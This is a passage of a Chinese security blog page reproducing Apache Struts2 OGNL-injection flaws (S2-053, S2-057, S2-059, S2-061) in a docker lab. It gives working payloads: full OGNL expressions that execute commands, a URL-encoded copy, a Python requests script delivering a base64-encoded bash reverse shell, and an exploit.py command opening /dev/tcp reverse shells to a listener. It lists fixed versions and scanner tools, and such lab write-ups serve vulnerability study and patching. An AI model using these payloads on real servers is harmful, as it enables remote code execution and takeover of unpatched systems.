+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.10.51:8080&#x2F;S2-053&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210224160841010.png" alt="image-20210224160841010"></p>
+<p>2、payload测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;100+100&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210224161012651.png" alt="image-20210224161012651"></p>
+<p>3、exp</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  S2-053-CVE-2017-12611 git:(master) python exploit.py http://192.168.10.51:8080/S2-053/ &quot;name&quot; &quot;bash -i &gt;&amp; /dev/tcp/192.168.10.51/4444 0&gt;&amp;1&quot;</span><br><span class="line"></span><br><span class="line">➜  ~ nc -lvnp 4444</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210224162036596.png" alt="image-20210224162036596"></p>
+<h5 id="漏洞修复-28"><a href="#漏洞修复-28" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>Upgrade to Struts 2.5.13 or Struts 2.3.34</p>
+<h5 id="参考-28"><a href="#参考-28" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-053</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="CVE-2018-11776"><a href="#CVE-2018-11776" class="headerlink" title="CVE-2018-11776"></a>CVE-2018-11776</h4><p>S2-057</p>
+<h5 id="漏洞描述-29"><a href="#漏洞描述-29" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>漏洞产生于网站配置xml的时候，有一个namespace的值，该值并没有做详细的安全过滤导致可以写入到XML上，尤其url标签值也没有做通配符的过滤，导致可以执行远程代码，以及系统命令到服务器系统中去。</p>
+<h5 id="影响范围-29"><a href="#影响范围-29" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts 2.0.4 - Struts 2.3.34</p>
+<p>Struts 2.5.0 - Struts 2.5.16</p>
+<h5 id="漏洞原理-29"><a href="#漏洞原理-29" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>漏洞产生于网站配置xml的时候，有一个namespace的值，该值并没有做详细的安全过滤导致可以写入到XML上，尤其url标签值也没有做通配符的过滤，导致可以执行远程代码，以及系统命令到服务器系统中去。</p>
+<h5 id="漏洞条件-29"><a href="#漏洞条件-29" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Struts 2.0.4 - Struts 2.3.34</p>
+<p>Struts 2.5.0 - Struts 2.5.16</p>
+<h5 id="漏洞检测-29"><a href="#漏洞检测-29" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、环境</p>
+<p>docker</p>
+<p>2、URL</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.10.51:8080&#x2F;struts2-showcase&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210226111744403.png" alt="image-20210226111744403"></p>
+<p>3、poc</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.10.51:8080/struts2-showcase/$%7B100*100%7D/actionChain1.action</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210224165507214.png" alt="image-20210224165507214"></p>
+<p>4、payload</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;</span><br><span class="line">(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#x27;struts.valueStack&#x27;].context).(#cr=#ct[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;)).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进行URLcode编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%24%7b%0a%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%63%74%3d%23%72%65%71%75%65%73%74%5b%27%73%74%72%75%74%73%2e%76%61%6c%75%65%53%74%61%63%6b%27%5d%2e%63%6f%6e%74%65%78%74%29%2e%28%23%63%72%3d%23%63%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%75%3d%23%63%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%2e%28%23%61%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%69%64%27%29%29%2e%28%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%23%61%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%7d</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210226113930629.png" alt="image-20210226113930629"></p>
+<h5 id="漏洞修复-29"><a href="#漏洞修复-29" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>Upgrade to Struts 2.3.35 or Struts 2.5.17</p>
+<h5 id="参考-29"><a href="#参考-29" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-057</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;tree&#x2F;master&#x2F;struts2&#x2F;s2-057</span><br></pre></td></tr></table></figure>
+
+<h4 id="CVE-2019-0230"><a href="#CVE-2019-0230" class="headerlink" title="CVE-2019-0230"></a>CVE-2019-0230</h4><p>S2-059</p>
+<h5 id="漏洞描述-30"><a href="#漏洞描述-30" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>Apache Struts框架, 会对某些特定的标签的属性值，比如id属性进行二次解析，所以攻击者可以传递将在呈现标签属性时再次解析的OGNL表达式，造成OGNL表达式注入。从而可能造成远程执行代码。</p>
+<h5 id="影响范围-30"><a href="#影响范围-30" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts 2.0.0 - Struts 2.5.20</p>
+<h5 id="漏洞原理-30"><a href="#漏洞原理-30" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>Apache Struts框架, 会对某些特定的标签的属性值，比如id属性进行二次解析，所以攻击者可以传递将在呈现标签属性时再次解析的OGNL表达式，造成OGNL表达式注入。从而可能造成远程执行代码。</p>
+<h5 id="漏洞条件-30"><a href="#漏洞条件-30" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Struts 2.0.0 - Struts 2.5.20</p>
+<h5 id="漏洞检测-30"><a href="#漏洞检测-30" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、漏洞环境</p>
+<p>docker</p>
+<p>2、URL访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.10.51:8080&#x2F;?id&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210226141214097.png" alt="image-20210226141214097"></p>
+<p>3、payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.10.51:8080&#x2F;?id&#x3D;%25%7B233*233%7D</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210226141252013.png" alt="image-20210226141252013"></p>
+<p>4、exp</p>
+<p>由于<code>Runtime.getRuntime().exec()</code>中不能使用管道符等bash需要的方法，我们需要用进行一次编码</p>
+<p><a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">编码</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.10.51:8080&quot;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line"><span class="string">&quot;id&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&#x27;&#x27;)).(#ognlUtil.setExcludedPackageNames(&#x27;&#x27;))&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">data2 = &#123;</span><br><span class="line"><span class="comment"># shell经过base64编码后放置exec中</span></span><br><span class="line"><span class="string">&quot;id&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwLjUxLzQ0NDQgMD4mMQo=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;))&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res1 = requests.post(url, data=data1)</span><br><span class="line">res2 = requests.post(url, data=data2)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210226141759347.png" alt="image-20210226141759347"></p>
+<h5 id="漏洞修复-30"><a href="#漏洞修复-30" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>Upgrade to Struts 2.5.22 or greater</p>
+<h5 id="参考-30"><a href="#参考-30" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-059</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;tree&#x2F;master&#x2F;struts2&#x2F;s2-059</span><br></pre></td></tr></table></figure>
+
+<h4 id="CVE-2020-17530"><a href="#CVE-2020-17530" class="headerlink" title="CVE-2020-17530"></a>CVE-2020-17530</h4><p>S2-061</p>
+<h5 id="漏洞描述-31"><a href="#漏洞描述-31" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>S2-061是对S2-059的绕过，Struts2官方对S2-059的修复方式是加强OGNL表达式沙盒,在使用某些tag等情况下可能存在OGNL表达式注入漏洞，从而造成远程代码执行。</p>
+<h5 id="影响范围-31"><a href="#影响范围-31" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts 2.0.0 - Struts 2.5.25</p>
+<h5 id="漏洞原理-31"><a href="#漏洞原理-31" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>S2-061是对S2-059的绕过，Struts2官方对S2-059的修复方式是加强OGNL表达式沙盒,在使用某些tag等情况下可能存在OGNL表达式注入漏洞，从而造成远程代码执行。</p>
+<h5 id="漏洞条件-31"><a href="#漏洞条件-31" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Struts 2.0.0 - Struts 2.5.25</p>
+<h5 id="漏洞检测-31"><a href="#漏洞检测-31" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、环境</p>
+<p>docker</p>
+<p>2、URL访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.10.51:8080&#x2F;?id&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210226144106276.png" alt="image-20210226144106276"></p>
+<p>3、payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.10.51:8080&#x2F;?id&#x3D;%25&#123;(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application[%27org.apache.tomcat.InstanceManager%27]).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr[%27struts.valueStack%27]).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d&#123;%27id%27&#125;).(%23res%3d%23exec.exec(%23cmd))&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210226144246470.png" alt="image-20210226144246470"></p>
+<p>4、shell</p>
+<p><img src="/images/Struts2/image-20210226144510898.png" alt="image-20210226144510898"></p>
+<h5 id="漏洞修复-31"><a href="#漏洞修复-31" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>Upgrade to Struts 2.5.26 or greater</p>
+<h5 id="参考-31"><a href="#参考-31" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-061</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;wuzuowei&#x2F;CVE-2020-17530</span><br></pre></td></tr></table></figure>
+
+<h3 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h3><h4 id="k8s"><a href="#k8s" class="headerlink" title="k8s"></a>k8s</h4><p>已支持多版本检测和shell反弹的作用</p>
+<h4 id="Struts2-Scan"><a href="#Struts2-Scan" class="headerlink" title="Struts2-Scan"></a>Struts2-Scan</h4><p><a target="_blank" rel="noopener" href="https://github.com/HatBoy/Struts2-Scan">Struts2-Scan</a></p>
+<p>此工具主要用于扫描Struts2框架漏洞检测及支持部分shell反弹功能。</p>
+<h4 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h4><p>部分实现poc可参考P牛的<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/struts2">github</a>里将会保存对应漏洞的poc。</p>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#Struts" >
+    <span class="tag-code">Struts</span>
+  </a>
+
+  <a href="/tags#OGNL" >
+    <span class="tag-code">OGNL</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2021/02/02/CVE-2021-3156/">
+        <span class="nav-arrow">← </span>
+        
+          CVE-2021-3156
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2021/03/04/CVE-2020-7961/">
+        
+          CVE-2020-7961
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+      <div class="qrcode">
+        <canvas id="share-qrcode"></canvas>
+        <p class="notice">扫描二维码，分享此文章</p>
+      </div>
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Struts-2-%E6%A6%82%E8%BF%B0"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">Struts 2 概述</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">漏洞环境</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%89%A9%E5%B1%95"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">扩展</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#OGNL"><span class="toc-nav-number">3.1.</span> <span class="toc-nav-text">OGNL</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#OGNL%E7%89%B9%E7%82%B9"><span class="toc-nav-number">3.1.1.</span> <span class="toc-nav-text">OGNL特点</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#OGNL%E5%AE%89%E5%85%A8"><span class="toc-nav-number">3.1.2.</span> <span class="toc-nav-text">OGNL安全</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#REST%E6%8F%92%E4%BB%B6"><span class="toc-nav-number">3.2.</span> <span class="toc-nav-text">REST插件</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">环境搭建</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#docker"><span class="toc-nav-number">4.1.</span> <span class="toc-nav-text">docker</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E9%95%9C%E5%83%8F%E6%8B%89%E5%8F%96"><span class="toc-nav-number">4.1.1.</span> <span class="toc-nav-text">镜像拉取</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E7%8E%AF%E5%A2%83%E5%90%AF%E5%8A%A8"><span class="toc-nav-number">4.1.2.</span> <span class="toc-nav-text">环境启动</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-nav-number">4.2.</span> <span class="toc-nav-text">其他</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%8B%89%E5%8F%96%E9%A1%B9%E7%9B%AE"><span class="toc-nav-number">4.2.1.</span> <span class="toc-nav-text">拉取项目</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E9%A1%B9%E7%9B%AE%E5%90%AF%E5%8A%A8"><span class="toc-nav-number">4.2.2.</span> <span class="toc-nav-text">项目启动</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Win"><span class="toc-nav-number">4.3.</span> <span class="toc-nav-text">Win</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E5%88%86%E7%B1%BB"><span class="toc-nav-number">5.</span> <span class="toc-nav-text">漏洞实战分类</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2007-4556"><span class="toc-nav-number">5.1.</span> <span class="toc-nav-text">CVE-2007-4556</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-nav-number">5.1.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-nav-number">5.1.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-nav-number">5.1.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6"><span class="toc-nav-number">5.1.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-nav-number">5.1.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-nav-number">5.1.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83"><span class="toc-nav-number">5.1.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#S2-002-%E6%97%A0CVE"><span class="toc-nav-number">5.2.</span> <span class="toc-nav-text">S2-002(无CVE)</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-1"><span class="toc-nav-number">5.2.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-1"><span class="toc-nav-number">5.2.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1"><span class="toc-nav-number">5.2.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-1"><span class="toc-nav-number">5.2.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-1"><span class="toc-nav-number">5.2.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="toc-nav-number">5.2.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-1"><span class="toc-nav-number">5.2.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#S2-003-%E6%97%A0CVE"><span class="toc-nav-number">5.3.</span> <span class="toc-nav-text">S2-003(无CVE)</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-2"><span class="toc-nav-number">5.3.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-2"><span class="toc-nav-number">5.3.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2"><span class="toc-nav-number">5.3.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-2"><span class="toc-nav-number">5.3.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-2"><span class="toc-nav-number">5.3.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-2"><span class="toc-nav-number">5.3.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-2"><span class="toc-nav-number">5.3.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#S2-004-%E6%97%A0CVE"><span class="toc-nav-number">5.4.</span> <span class="toc-nav-text">S2-004(无CVE)</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-3"><span class="toc-nav-number">5.4.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-3"><span class="toc-nav-number">5.4.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-3"><span class="toc-nav-number">5.4.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-3"><span class="toc-nav-number">5.4.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-3"><span class="toc-nav-number">5.4.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-3"><span class="toc-nav-number">5.4.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-3"><span class="toc-nav-number">5.4.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2010-1870"><span class="toc-nav-number">5.5.</span> <span class="toc-nav-text">CVE-2010-1870</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-4"><span class="toc-nav-number">5.5.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" 